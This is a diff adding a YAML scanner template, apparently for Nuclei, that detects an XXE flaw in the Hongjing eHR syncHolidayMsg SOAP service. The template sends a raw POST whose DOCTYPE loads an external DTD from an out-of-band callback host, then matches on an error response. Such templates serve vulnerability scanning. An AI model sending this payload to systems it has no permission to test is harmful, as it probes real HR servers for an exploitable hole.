@@ -1,0 +1,42 @@
+id: poc-yaml-hjsoft-ehr-syncholidaymsg-xxe
+info:
+  name: 宏景eHR syncHolidayMsg XXE漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: DNSLOG,xxe
+
+http:
+  - raw:
+      - |
+        POST /services/HrpService HTTP/1.1
+        SOAPAction: ""
+        Content-Type: text/xml;charset=UTF-8
+        Host: {{Hostname}}
+
+        <!DOCTYPE syscode SYSTEM "http://{{interactsh-url}}/syncHolidayMsg">
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <hrp:syncHolidayMsg>
+                 <hrp:in0>ORs1P9DMem9byoEeSArcK+T60iqKxo6h2M7ONzAhR7w=</hrp:in0>
+                 <hrp:in1>cni23</hrp:in1>
+                 <hrp:in2><syscode>&send;</syscode></hrp:in2>
+              </hrp:syncHolidayMsg>
+           </soapenv:Body>
+        </soapenv:Envelope>
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "java.io.IOException"
+          - "syncHolidayMsg"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
